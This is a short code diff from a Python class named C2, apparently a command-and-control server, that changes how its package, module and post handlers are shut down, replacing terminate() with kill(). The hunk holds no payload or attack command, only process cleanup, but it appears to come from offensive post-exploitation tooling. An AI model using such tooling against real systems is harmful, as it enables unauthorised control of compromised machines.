@@ -495,10 +495,10 @@ class C2():
 
         """
 
-        # terminate handlers running on other ports
-        globals()['package_handler'].terminate()
-        globals()['module_handler'].terminate()
-        globals()['post_handler'].terminate()
+        # kill handlers running on other ports
+        globals()['package_handler'].kill()
+        globals()['module_handler'].kill()
+        globals()['post_handler'].kill()
 
         # kill subprocesses (subprocess.Popen)
         for proc in self.child_procs.values():
